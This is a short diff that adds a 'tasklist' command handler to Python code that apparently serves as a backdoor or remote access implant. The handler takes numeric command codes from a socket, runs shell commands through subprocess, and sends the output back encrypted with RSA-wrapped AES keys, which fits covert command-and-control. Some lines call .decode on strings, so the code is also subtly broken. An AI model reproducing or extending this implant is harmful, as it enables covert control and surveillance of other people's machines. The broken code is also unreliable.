@@ -663,6 +663,29 @@ while True:
             send_one_message(s, eoutput)
 
 
+        # 'tasklist'
+        elif int(float(command)) == -578410429:
+            tasklist_AES = AES256()
+
+            ae_key18 = tasklist_AES.get_key()
+            apubKey18 = RSA.import_key(known_hosts[0])
+            encryptor18 = PKCS1_OAEP.new(apubKey18)
+            e_key18 = encryptor18.encrypt(ae_key18)
+
+            send_one_message(s, e_key18)
+
+            command = "tasklist"
+
+            cmd = subprocess.Popen(command[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
+                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte).decode('utf-8')
+            currentWD = os.getcwd() + "> "
+
+            eoutput = AES256._encrypt(output_str, tasklist_AES.get_key())
+            send_one_message(s, eoutput)
+
+
 
 
         elif int(float(command)) == 603295412:
